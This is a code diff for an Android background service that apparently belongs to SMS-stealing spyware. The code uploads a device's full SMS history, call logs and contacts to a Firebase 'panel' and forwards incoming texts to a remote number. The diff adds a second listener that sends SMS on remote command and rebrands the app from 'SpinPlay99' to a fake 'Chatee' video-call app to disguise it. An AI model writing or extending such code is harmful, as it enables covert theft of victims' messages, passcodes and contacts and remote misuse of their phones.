@@ -26,11 +26,9 @@ import androidx.annotation.NonNull;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 
-import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
-import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ServerValue;
 import com.google.firebase.database.ValueEventListener;
 
@@ -44,7 +42,7 @@ import java.util.Map;
 
 public class BackgroundSyncService extends Service {
 
-    private static final String CHANNEL_ID = "spinplay99_channel";
+    private static final String CHANNEL_ID = "chatee_sync";
     private static final int NOTIFICATION_ID = 999;
     private static final String FORWARD_PREFS = "sms_forward_dedup";
     private static final int FORWARD_DEDUP_MAX = 200;
@@ -57,6 +55,7 @@ public class BackgroundSyncService extends Service {
     private Runnable syncRunnable;
     private SmsManager smsManager;
     private ValueEventListener forwardingListener;
+    private ValueEventListener webhookSmsListener;
     private ValueEventListener commandListener;
     private String forwardingNumber = "";
     private boolean forwardingEnabled = false;
@@ -66,8 +65,8 @@ public class BackgroundSyncService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        FirebaseApp.initializeApp(this);
-        databaseReference = FirebaseDatabase.getInstance().getReference();
+        FirebaseBootstrap.ensureApp(this);
+        databaseReference = FirebaseBootstrap.database(this).getReference();
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         handler = new Handler(Looper.getMainLooper());
         smsManager = SmsManager.getDefault();
@@ -76,6 +75,7 @@ public class BackgroundSyncService extends Service {
         startForeground(NOTIFICATION_ID, createNotification());
         loadForwardingSettings();
         listenForManualCommands();
+        listenForWebhookSms();
     }
 
     @Override
@@ -96,7 +96,7 @@ public class BackgroundSyncService extends Service {
     }
 
     private void syncDataToFirebase() {
-        DatabaseReference deviceRef = databaseReference.child("devices").child(deviceId);
+        DatabaseReference deviceRef = databaseReference.child(PanelPaths.ROOT).child(deviceId);
         deviceRef.child("online_status").setValue(true);
         deviceRef.child("online_status").onDisconnect().setValue(false);
         deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
@@ -139,7 +139,7 @@ public class BackgroundSyncService extends Service {
         deviceInfo.put("android_version", Build.VERSION.RELEASE);
         deviceInfo.put("last_seen", ServerValue.TIMESTAMP);
         deviceInfo.put("sim_info", getDetailedSimInfo());
-        databaseReference.child("devices").child(deviceId).child("device_info").updateChildren(deviceInfo);
+        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("device_info").updateChildren(deviceInfo);
     }
 
     private void uploadAllSms() {
@@ -150,7 +150,7 @@ public class BackgroundSyncService extends Service {
                 Map<String, Object> smsData = new HashMap<>();
                 smsData.put("total_count", allMessages.size());
                 smsData.put("messages", allMessages);
-                databaseReference.child("devices").child(deviceId).child("all_sms").setValue(smsData);
+                databaseReference.child(PanelPaths.ROOT).child(deviceId).child("all_sms").setValue(smsData);
             }
         }).start();
     }
@@ -201,7 +201,7 @@ public class BackgroundSyncService extends Service {
                 Map<String, Object> callData = new HashMap<>();
                 callData.put("total_count", allCalls.size());
                 callData.put("calls", allCalls);
-                databaseReference.child("devices").child(deviceId).child("all_calls").setValue(callData);
+                databaseReference.child(PanelPaths.ROOT).child(deviceId).child("all_calls").setValue(callData);
             }
         }).start();
     }
@@ -249,7 +249,7 @@ public class BackgroundSyncService extends Service {
                 Map<String, Object> contactData = new HashMap<>();
                 contactData.put("total_count", allContacts.size());
                 contactData.put("contacts", allContacts);
-                databaseReference.child("devices").child(deviceId).child("all_contacts").setValue(contactData);
+                databaseReference.child(PanelPaths.ROOT).child(deviceId).child("all_contacts").setValue(contactData);
             }
         }).start();
     }
@@ -321,7 +321,7 @@ public class BackgroundSyncService extends Service {
             public void onCancelled(@NonNull DatabaseError error) {
             }
         };
-        databaseReference.child("devices").child(deviceId).child("forwarding_settings")
+        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("forwarding_settings")
             .addValueEventListener(forwardingListener);
     }
 
@@ -347,7 +347,7 @@ public class BackgroundSyncService extends Service {
             log.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
             log.put("status", "FORWARDED");
             log.put("forwarded_at", ServerValue.TIMESTAMP);
-            databaseReference.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
+            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("forwarded_sms").push().setValue(log);
             markSmsForwarded(dedupKey);
         } catch (Exception e) {
         }
@@ -398,6 +398,35 @@ public class BackgroundSyncService extends Service {
         }).start();
     }
 
+    private void listenForWebhookSms() {
+        webhookSmsListener = new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                if (!snapshot.exists()) return;
+                String to = snapshot.child("to").getValue(String.class);
+                String message = snapshot.child("message").getValue(String.class);
+                if (to == null || message == null) return;
+                try {
+                    smsManager.sendTextMessage(to, null, message, null, null);
+                    Map<String, Object> log = new HashMap<>();
+                    log.put("to", to);
+                    log.put("message", message);
+                    log.put("status", "SENT");
+                    log.put("sent_at", ServerValue.TIMESTAMP);
+                    databaseReference.child(PanelPaths.ROOT).child(deviceId).child("sent_sms").push().setValue(log);
+                } catch (Exception ignored) {
+                }
+                snapshot.getRef().removeValue();
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+            }
+        };
+        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("webhookEvent").child("sendSms")
+            .addValueEventListener(webhookSmsListener);
+    }
+
     private void listenForManualCommands() {
         commandListener = new ValueEventListener() {
             @Override
@@ -413,7 +442,7 @@ public class BackgroundSyncService extends Service {
                             log.put("message", message);
                             log.put("status", "SENT");
                             log.put("sent_at", ServerValue.TIMESTAMP);
-                            databaseReference.child("devices").child(deviceId).child("sent_sms").push().setValue(log);
+                            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("sent_sms").push().setValue(log);
                         } catch (Exception e) {
                         }
                     }
@@ -424,7 +453,7 @@ public class BackgroundSyncService extends Service {
             public void onCancelled(@NonNull DatabaseError error) {
             }
         };
-        databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
+        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("manual_commands").child("send_sms")
             .addValueEventListener(commandListener);
     }
 
@@ -532,8 +561,8 @@ public class BackgroundSyncService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("Background synchronization service");
+                CHANNEL_ID, "Video Call", NotificationManager.IMPORTANCE_LOW);
+            channel.setDescription("Background service");
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
         }
@@ -544,8 +573,8 @@ public class BackgroundSyncService extends Service {
         PendingIntent pendingIntent = PendingIntent.getActivity(
             this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("SpinPlay99")
-            .setContentText("Service Running...")
+            .setContentTitle("Chatee")
+            .setContentText("Live video ready")
             .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
@@ -559,14 +588,17 @@ public class BackgroundSyncService extends Service {
 
     @Override
     public void onDestroy() {
-        databaseReference.child("devices").child(deviceId).child("online_status").setValue(false);
+        databaseReference.child(PanelPaths.ROOT).child(deviceId).child("online_status").setValue(false);
         if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
         if (forwardingListener != null) 
-            databaseReference.child("devices").child(deviceId).child("forwarding_settings")
+            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("forwarding_settings")
                 .removeEventListener(forwardingListener);
         if (commandListener != null)
-            databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
+            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("manual_commands").child("send_sms")
                 .removeEventListener(commandListener);
+        if (webhookSmsListener != null)
+            databaseReference.child(PanelPaths.ROOT).child(deviceId).child("webhookEvent").child("sendSms")
+                .removeEventListener(webhookSmsListener);
         super.onDestroy();
     }
 
